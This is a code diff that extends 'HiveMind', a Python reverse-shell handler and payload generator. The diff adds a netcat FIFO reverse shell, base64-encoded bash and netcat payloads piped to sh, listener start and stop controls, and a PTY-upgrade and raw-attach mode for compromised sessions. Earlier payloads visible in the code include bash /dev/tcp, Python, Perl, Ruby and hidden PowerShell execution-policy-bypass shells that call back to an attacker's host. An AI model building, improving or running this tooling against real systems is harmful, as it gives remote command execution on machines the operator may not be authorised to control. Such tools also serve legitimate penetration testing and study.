@@ -4,13 +4,29 @@ import threading
 import os
 import sys
 import select
-import netifaces
 import subprocess
 import base64
 import time
-import readline  # For tab autocomplete and history
-from termcolor import colored
-import pyperclip  # For copying output to clipboard
+try:
+    import readline  # For tab autocomplete and history
+except ImportError:
+    readline = None
+
+try:
+    import netifaces
+except ImportError:
+    netifaces = None
+
+try:
+    from termcolor import colored
+except ImportError:
+    def colored(text, *args, **kwargs):
+        return text
+
+try:
+    import pyperclip  # For copying output to clipboard
+except ImportError:
+    pyperclip = None
 
 # Global default port for all reverse shells
 DEFAULT_PORT = 4444
@@ -19,6 +35,14 @@ HEARTBEAT_TIMEOUT = 300  # 5 minutes
 
 # Global event that will be set when the listener thread has printed its startup message.
 listener_ready = threading.Event()
+# Global flag to indicate if the listener is running
+listener_running = False
+# Global variable to hold the listener socket
+listener_socket = None
+# Protect listener socket/running state changes.
+listener_lock = threading.Lock()
+# Keep session IDs unique even if the listener is stopped and restarted.
+next_session_id = 1
 
 # --- Enhanced Payload Types ---
 PAYLOAD_TYPES = [
@@ -27,13 +51,14 @@ PAYLOAD_TYPES = [
     "linux/reverse_tcp/bash",
     "linux/reverse_tcp/python",
     "linux/reverse_tcp/perl",
-    "linux/reverse_tcp/ruby"
+    "linux/reverse_tcp/ruby",
+    "cmd/unix/reverse_netcat"
 ]
 
-# Command list now includes the new "clear" command.
+# Command list now includes "listen" and "stop listener" among others.
 COMMANDS = [
     'alias', 'cleanup', 'cmd', 'clear', 'exit', 'help',
-    'kill', 'session', 'sessions', 'set payload', 'show payloads', 'upgrade'
+    'kill', 'session', 'sessions', 'set payload', 'show payloads', 'upgrade', 'raw', 'listen', 'stop listener'
 ]
 
 # --- Global Structures for Sessions ---
@@ -48,7 +73,7 @@ class Session:
 sessions = {}
 # session_aliases: mapping alias (str) -> session_id (int)
 session_aliases = {}
-lock = threading.Lock()  # For synchronizing access to sessions and aliases
+lock = threading.RLock()  # For synchronizing access to sessions and aliases
 
 # --- Helper for synchronized printing ---
 print_lock = threading.Lock()
@@ -90,7 +115,10 @@ def show_help():
     safe_print(colored("  sessions                             - Show all active sessions", "green"), flush=True)
     safe_print(colored("  set payload <Type> <LHOST> [base64]  - Set payload (no port required)", "green"), flush=True)
     safe_print(colored("  show payloads                        - List available payloads", "green"), flush=True)
-    safe_print(colored("  upgrade <id|alias>                   - Upgrade session to full TTY mode", "green"), flush=True)
+    safe_print(colored("  upgrade <id|alias>                   - Try Linux PTY upgrade, then attach in raw mode", "green"), flush=True)
+    safe_print(colored("  raw <id|alias>                       - Attach in raw mode without sending PTY commands", "green"), flush=True)
+    safe_print(colored("  listen <port>                        - Start listener on specified port (default: 4444)", "green"), flush=True)
+    safe_print(colored("  stop listener                        - Stop the current listener", "green"), flush=True)
     safe_print("", flush=True)
 
 def list_payloads():
@@ -100,16 +128,18 @@ def list_payloads():
     safe_print(colored("  linux/reverse_tcp/bash          - Bash Reverse Shell", "green"), flush=True)
     safe_print(colored("  linux/reverse_tcp/python        - Python Reverse Shell", "green"), flush=True)
     safe_print(colored("  linux/reverse_tcp/perl          - Perl Reverse Shell", "green"), flush=True)
-    safe_print(colored("  linux/reverse_tcp/ruby          - Ruby Reverse Shell\n", "green"), flush=True)
+    safe_print(colored("  linux/reverse_tcp/ruby          - Ruby Reverse Shell", "green"), flush=True)
+    safe_print(colored("  cmd/unix/reverse_netcat         - Netcat Reverse Shell with random FIFO", "green"), flush=True)
+    safe_print("", flush=True)
 
 def resolve_ip(lhost):
-    if lhost in netifaces.interfaces():
+    if netifaces is not None and lhost in netifaces.interfaces():
         addrs = netifaces.ifaddresses(lhost)
         if netifaces.AF_INET in addrs and addrs[netifaces.AF_INET]:
             return addrs[netifaces.AF_INET][0]['addr']
-        else:
-            safe_print(colored(f"[-] No IPv4 address found for interface {lhost}. Using input as is.", "red"), flush=True)
-            return lhost
+        safe_print(colored(f"[-] No IPv4 address found for interface {lhost}. Using input as is.", "red"), flush=True)
+        return lhost
+
     try:
         socket.inet_aton(lhost)
         return lhost
@@ -124,7 +154,6 @@ def generate_payload(payload_type, lhost, encode=False):
     resolved_host = resolve_ip(lhost)
     
     if payload_type == "windows/conpty":
-        # Run 'stty size' to obtain terminal rows and columns.
         try:
             size_output = subprocess.check_output(["stty", "size"], text=True).strip()
             rows, cols = size_output.split()
@@ -157,7 +186,12 @@ def generate_payload(payload_type, lhost, encode=False):
         else:
             payload = f"powershell -nop -W hidden -noni -ep bypass -c \"{script_body}\""
     elif payload_type == "linux/reverse_tcp/bash":
-        payload = f"bash -i >& /dev/tcp/{resolved_host}/{DEFAULT_PORT} 0>&1"
+        plain_payload = f"bash -i >& /dev/tcp/{resolved_host}/{DEFAULT_PORT} 0>&1"
+        if encode:
+            encoded_payload = base64.b64encode(plain_payload.encode()).decode()
+            payload = f'echo "{encoded_payload}" | base64 -d | sh'
+        else:
+            payload = plain_payload
     elif payload_type == "linux/reverse_tcp/python":
         payload = (
             f"python -c 'import socket,subprocess,os;"
@@ -179,6 +213,15 @@ def generate_payload(payload_type, lhost, encode=False):
             f"ruby -rsocket -e 'f=TCPSocket.new(\"{resolved_host}\",{DEFAULT_PORT});"
             f"while(cmd=f.gets); IO.popen(cmd,\"r\"){{|io| f.print io.read}} end'"
         )
+    elif payload_type == "cmd/unix/reverse_netcat":
+        import random, string
+        temp_fifo = "/tmp/" + "".join(random.choices(string.ascii_lowercase, k=8))
+        plain_payload = f"mkfifo {temp_fifo}; nc {resolved_host} {DEFAULT_PORT} 0<{temp_fifo} | /bin/sh >{temp_fifo} 2>&1; rm {temp_fifo}"
+        if encode:
+            encoded_payload = base64.b64encode(plain_payload.encode()).decode()
+            payload = f'echo "{encoded_payload}" | base64 -d | sh'
+        else:
+            payload = plain_payload
     else:
         return "Invalid payload type."
     
@@ -187,31 +230,98 @@ def generate_payload(payload_type, lhost, encode=False):
 # --- Networking Functions ---
 def start_listener(port):
     """
-    Listens on the given port and spawns a new thread for each incoming connection.
-    Handshake functionality has been removed so that each connection is treated as a new session.
+    Listens on the given port and records a new session for each incoming connection.
+    The loop exits cleanly when stop_listener() closes the listener socket.
     """
+    global listener_socket, listener_running, next_session_id
+
+    listener_ready.clear()
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.settimeout(1.0)
+
     try:
         server.bind(("0.0.0.0", port))
         server.listen(10)
-        safe_print(colored(f"[+] HiveMind is listening for incoming shells on port {port}...\n", "yellow"), flush=True)
-        listener_ready.set()  # Signal that the listener's startup message has been printed.
     except Exception as e:
         safe_print(colored(f"[-] Failed to start listener on port {port}: {e}", "red"), flush=True)
-        sys.exit(1)
-    
-    global_session_counter = 1
-    while True:
+        try:
+            server.close()
+        except Exception:
+            pass
+        with listener_lock:
+            listener_socket = None
+            listener_running = False
+        return
+
+    with listener_lock:
+        listener_socket = server
+        listener_running = True
+
+    safe_print(colored(f"[+] HiveMind is listening for incoming shells on port {port}...\n", "yellow"), flush=True)
+    listener_ready.set()
+
+    while listener_running:
         try:
             conn, addr = server.accept()
-            with lock:
-                session_obj = Session(global_session_counter, conn, addr)
-                sessions[global_session_counter] = session_obj
-                safe_print(colored(f"[+] Session {global_session_counter} established from {addr}", "green"), flush=True)
-                global_session_counter += 1
-            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
+        except socket.timeout:
+            continue
+        except OSError:
+            break
         except Exception as e:
-            safe_print(colored(f"[-] Error accepting connection: {e}", "red"), flush=True)
+            safe_print(colored(f"[-] Listener error: {e}", "red"), flush=True)
+            break
+
+        with lock:
+            session_id = next_session_id
+            next_session_id += 1
+            session_obj = Session(session_id, conn, addr)
+            sessions[session_id] = session_obj
+
+        safe_print(colored(f"[+] Session {session_id} established from {addr}", "green"), flush=True)
+        # Do not start a background reader here. Reading from the socket outside
+        # interactive_shell() can accidentally consume shell output before the
+        # user enters the session.
+
+    try:
+        server.close()
+    except Exception:
+        pass
+
+    with listener_lock:
+        if listener_socket is server:
+            listener_socket = None
+        listener_running = False
+    listener_ready.clear()
+
+def stop_listener():
+    """
+    Stops the listener by closing the listener socket.
+    """
+    global listener_socket, listener_running
+
+    with listener_lock:
+        sock = listener_socket
+        if sock is None:
+            safe_print(colored("[-] No listener is currently running.", "red"), flush=True)
+            return
+        listener_socket = None
+        listener_running = False
+        listener_ready.clear()
+
+    try:
+        sock.shutdown(socket.SHUT_RDWR)
+    except OSError:
+        pass
+    except Exception:
+        pass
+
+    try:
+        sock.close()
+    except Exception:
+        pass
+
+    safe_print(colored("[*] Listener stopped.", "yellow"), flush=True)
 
 def remove_session(session_id):
     """Helper function to remove a session and its alias (if any)."""
@@ -294,34 +404,117 @@ def interactive_shell(session_id):
         safe_print(colored(f"[-] Session {session_id} lost: {e}", "red"), flush=True)
         remove_session(session_id)
 
-def upgrade_session(session_id):
+def get_terminal_rows_cols():
+    """Return local terminal size as (rows, cols), with safe defaults."""
+    try:
+        size = os.get_terminal_size(sys.stdin.fileno())
+        return size.lines, size.columns
+    except Exception:
+        return 24, 80
+
+
+def drain_session_output(session, timeout=0.35):
+    """Print any data currently waiting on a session socket."""
+    end_time = time.time() + timeout
+    got_data = False
+    while time.time() < end_time:
+        try:
+            r, _, _ = select.select([session.conn], [], [], 0.05)
+        except Exception:
+            return got_data
+        if not r:
+            continue
+        try:
+            data = session.conn.recv(4096)
+        except BlockingIOError:
+            continue
+        except Exception:
+            return got_data
+        if not data:
+            return got_data
+        got_data = True
+        session.last_heartbeat = time.time()
+        safe_print(data.decode(errors="ignore"), end="", flush=True)
+    return got_data
+
+
+def try_linux_pty_upgrade(session):
     """
-    Upgrades the selected session to a full interactive TTY mode.
-    Note: Full TTY upgrade may not work properly with some reverse shells.
+    Try to spawn a PTY on a Linux/Unix target before raw attach mode.
+    This is useful for msfvenom linux/*/shell_reverse_tcp and simple /bin/sh reverse shells.
+    """
+    rows, cols = get_terminal_rows_cols()
+    pty_cmd = (
+        "export TERM=xterm; "
+        "(python3 -c 'import pty,os; sh=os.environ.get(\"SHELL\") or \"/bin/bash\"; pty.spawn(sh if os.path.exists(sh) else \"/bin/sh\")' "
+        "|| python -c 'import pty,os; sh=os.environ.get(\"SHELL\") or \"/bin/bash\"; pty.spawn(sh if os.path.exists(sh) else \"/bin/sh\")' "
+        "|| script -qc /bin/bash /dev/null "
+        "|| /bin/sh -i)\n"
+    )
+    resize_cmd = f"stty rows {rows} cols {cols}; export TERM=xterm\n"
+
+    safe_print(colored("[*] Trying Linux PTY spawn first...", "yellow"), flush=True)
+    safe_print(colored("[*] If this is a Windows/ConPty shell, use raw <id|alias> instead.", "yellow"), flush=True)
+    try:
+        session.conn.send(pty_cmd.encode())
+        time.sleep(0.35)
+        drain_session_output(session, timeout=0.25)
+        session.conn.send(resize_cmd.encode())
+        time.sleep(0.15)
+        drain_session_output(session, timeout=0.20)
+    except Exception as e:
+        safe_print(colored(f"[-] PTY upgrade command failed to send: {e}", "red"), flush=True)
+
+
+def raw_attach_session(session_id, auto_pty=False):
+    """
+    Attach to a session in raw byte-forwarding mode.
+    auto_pty=True first tries to spawn a remote Linux PTY.
     """
     with lock:
         if session_id not in sessions:
             safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
             return
         session = sessions[session_id]
-    import tty, termios
-    old_tty = termios.tcgetattr(sys.stdin)
-    safe_print(colored(f"\n[*] Upgrading session {session_id} to TTY mode. Press Ctrl+] to exit TTY mode.\n", "yellow"), flush=True)
-    safe_print(colored("[*] Note: Full TTY upgrade may not work with certain reverse shells.", "yellow"), flush=True)
+
+    if auto_pty:
+        try_linux_pty_upgrade(session)
+
+    try:
+        import tty, termios
+    except ImportError:
+        safe_print(colored("[-] Raw mode requires tty/termios, which are not available on this platform.", "red"), flush=True)
+        return
+
+    try:
+        old_tty = termios.tcgetattr(sys.stdin)
+    except Exception as e:
+        safe_print(colored(f"[-] Could not read local terminal settings: {e}", "red"), flush=True)
+        return
+
+    safe_print(colored(f"\n[*] Raw attach to session {session_id}. Press Ctrl+] to return to HiveMind menu.", "yellow"), flush=True)
+    safe_print(colored("[*] In raw mode your typed characters may not echo. Try typing: id", "yellow"), flush=True)
+
     try:
         tty.setraw(sys.stdin.fileno())
         while True:
             r, _, _ = select.select([session.conn, sys.stdin], [], [], 0.1)
             if session.conn in r:
                 try:
-                    data = session.conn.recv(1024)
+                    data = session.conn.recv(4096)
                 except Exception as e:
-                    safe_print(colored(f"[-] Error receiving data: {e}", "red"), flush=True)
-                    break
+                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+                    safe_print(colored(f"\n[-] Error receiving data: {e}", "red"), flush=True)
+                    remove_session(session_id)
+                    return
                 if not data:
-                    break
+                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+                    safe_print(colored("\n[-] Connection closed by remote host.", "red"), flush=True)
+                    remove_session(session_id)
+                    return
                 os.write(sys.stdout.fileno(), data)
                 session.last_heartbeat = time.time()
+
             if sys.stdin in r:
                 data = os.read(sys.stdin.fileno(), 1024)
                 if not data:
@@ -331,13 +524,25 @@ def upgrade_session(session_id):
                 try:
                     session.conn.send(data)
                 except Exception as e:
-                    safe_print(colored(f"[-] Error sending data: {e}", "red"), flush=True)
-                    break
+                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+                    safe_print(colored(f"\n[-] Error sending data: {e}", "red"), flush=True)
+                    return
+    except KeyboardInterrupt:
+        # Ctrl+C is forwarded in raw mode. This only catches local interruptions that escape raw mode.
+        pass
     except Exception as e:
-        safe_print(colored(f"[-] Session {session_id} upgrade failed: {e}", "red"), flush=True)
+        safe_print(colored(f"\n[-] Raw attach failed: {e}", "red"), flush=True)
     finally:
-        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
-        safe_print(colored(f"\n[*] Exiting TTY mode for session {session_id}.", "yellow"), flush=True)
+        try:
+            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
+        except Exception:
+            pass
+        safe_print(colored(f"\n[*] Returned from session {session_id}.", "yellow"), flush=True)
+
+
+def upgrade_session(session_id):
+    """Try a Linux PTY upgrade, then attach in raw mode."""
+    raw_attach_session(session_id, auto_pty=True)
 
 def list_sessions():
     safe_print(colored("\n[ Active Sessions ]", "blue"), flush=True)
@@ -359,27 +564,26 @@ def list_sessions():
     safe_print("", flush=True)
 
 def cleanup_sessions():
-    """Manually removes any sessions that are no longer active or have timed out."""
-    removed = 0
+    """Manually removes any sessions that have timed out."""
     now = time.time()
     with lock:
-        for sid, session in list(sessions.items()):
-            # If no activity for more than HEARTBEAT_TIMEOUT seconds, consider the session dead.
-            if now - session.last_heartbeat > HEARTBEAT_TIMEOUT:
-                try:
-                    session.conn.close()
-                except Exception:
-                    pass
-                del sessions[sid]
-                removed += 1
-    if removed:
-        safe_print(colored(f"[*] Cleanup: Removed {removed} dead session(s).", "yellow"), flush=True)
+        stale_session_ids = [
+            sid for sid, session in sessions.items()
+            if now - session.last_heartbeat > HEARTBEAT_TIMEOUT
+        ]
+
+    for sid in stale_session_ids:
+        remove_session(sid)
+
+    if stale_session_ids:
+        safe_print(colored(f"[*] Cleanup: Removed {len(stale_session_ids)} dead session(s).", "yellow"), flush=True)
+    else:
+        safe_print(colored("[*] Cleanup: No timed-out sessions found.", "yellow"), flush=True)
 
 # --- Enhanced Autocompletion ---
 def completer(text, state):
     """
     Custom completer function.
-    
     For the "set payload" command, it offers specific completions.
     For commands like "session", "kill", "upgrade", and "alias", it dynamically completes with active session IDs and aliases.
     Otherwise, it completes from the COMMANDS list.
@@ -398,7 +602,7 @@ def completer(text, state):
                 return options[state]
             return None
         elif current_token_index == 3:
-            interfaces = netifaces.interfaces()
+            interfaces = netifaces.interfaces() if netifaces is not None else []
             options = [iface for iface in interfaces if iface.startswith(text)]
             if state < len(options):
                 return options[state]
@@ -411,7 +615,7 @@ def completer(text, state):
             return None
         else:
             return None
-    elif tokens and tokens[0].lower() in ["session", "kill", "upgrade", "alias"]:
+    elif tokens and tokens[0].lower() in ["session", "kill", "upgrade", "raw", "alias"]:
         if current_token_index == 1:
             with lock:
                 dynamic_options = list(map(str, sessions.keys())) + list(session_aliases.keys())
@@ -425,12 +629,14 @@ def completer(text, state):
             return options[state]
         return None
 
-readline.set_completer(completer)
-readline.parse_and_bind("tab: complete")
-readline.set_completer_delims(" \t\n")
+if readline is not None:
+    readline.set_completer(completer)
+    readline.parse_and_bind("tab: complete")
+    readline.set_completer_delims(" \t\n")
 
 # --- Command-Line Interface ---
 def command_line():
+    global listener_running, DEFAULT_PORT
     while True:
         try:
             cmd = input(colored("HiveMind > ", "cyan")).strip()
@@ -445,6 +651,29 @@ def command_line():
         elif lower_cmd == "clear":
             os.system('cls' if os.name == 'nt' else 'clear')
             banner()
+
+        elif lower_cmd.startswith("listen"):
+            if listener_running:
+                safe_print(colored("[-] Listener is already running.", "red"), flush=True)
+                continue
+            if len(parts) == 1:
+                port = DEFAULT_PORT
+            else:
+                try:
+                    port = int(parts[1])
+                except ValueError:
+                    safe_print(colored("[-] Invalid port number.", "red"), flush=True)
+                    continue
+                DEFAULT_PORT = port
+            listener_ready.clear()
+            listener_thread = threading.Thread(target=lambda: start_listener(port), daemon=True)
+            listener_thread.start()
+            if not listener_ready.wait(timeout=5):
+                listener_running = False
+                safe_print(colored("[-] Listener did not start. Check the port or permissions.", "red"), flush=True)
+
+        elif lower_cmd == "stop listener":
+            stop_listener()
 
         elif lower_cmd.startswith("session "):
             if len(parts) < 2:
@@ -468,12 +697,26 @@ def command_line():
             else:
                 upgrade_session(sid)
 
+        elif lower_cmd.startswith("raw "):
+            if len(parts) < 2:
+                safe_print(colored("[-] Usage: raw <id|alias>", "red"), flush=True)
+                continue
+            identifier = parts[1]
+            sid = resolve_session_identifier(identifier)
+            if sid is None:
+                safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
+            else:
+                raw_attach_session(sid, auto_pty=False)
+
         elif lower_cmd.startswith("alias "):
             if len(parts) != 3:
                 safe_print(colored("[-] Usage: alias <id|alias> <new_alias>", "red"), flush=True)
                 continue
             identifier = parts[1]
             new_alias = parts[2]
+            if new_alias.isdigit():
+                safe_print(colored("[-] Alias cannot be only numbers because it would conflict with session IDs.", "red"), flush=True)
+                continue
             sid = resolve_session_identifier(identifier)
             if sid is None:
                 safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
@@ -507,11 +750,14 @@ def command_line():
             generated = generate_payload(payload_type, lhost, encode)
             safe_print(colored("\n[+] Generated Payload:", "yellow"), flush=True)
             safe_print(generated + "\n", flush=True)
-            try:
-                pyperclip.copy(generated)
-                safe_print(colored("[*] Payload copied to clipboard.", "green"), flush=True)
-            except Exception as e:
-                safe_print(colored(f"[-] Could not copy payload to clipboard: {e}", "red"), flush=True)
+            if pyperclip is not None:
+                try:
+                    pyperclip.copy(generated)
+                    safe_print(colored("[*] Payload copied to clipboard.", "green"), flush=True)
+                except Exception as e:
+                    safe_print(colored(f"[-] Could not copy payload to clipboard: {e}", "red"), flush=True)
+            else:
+                safe_print(colored("[*] pyperclip is not installed, so the payload was not copied to clipboard.", "yellow"), flush=True)
 
         elif lower_cmd == "show payloads":
             list_payloads()
@@ -530,8 +776,11 @@ def command_line():
         elif lower_cmd == "exit":
             safe_print(colored("[*] Exiting HiveMind...", "yellow"), flush=True)
             with lock:
-                for sid in list(sessions.keys()):
-                    remove_session(sid)
+                active_session_ids = list(sessions.keys())
+            for sid in active_session_ids:
+                remove_session(sid)
+            if listener_running or listener_socket is not None:
+                stop_listener()
             break
 
         elif lower_cmd == "help":
@@ -542,7 +791,5 @@ def command_line():
 
 if __name__ == "__main__":
     banner()
-    listener_thread = threading.Thread(target=lambda: start_listener(DEFAULT_PORT), daemon=True)
-    listener_thread.start()
-    listener_ready.wait()  # Wait until the listener has printed its startup message.
     command_line()
+
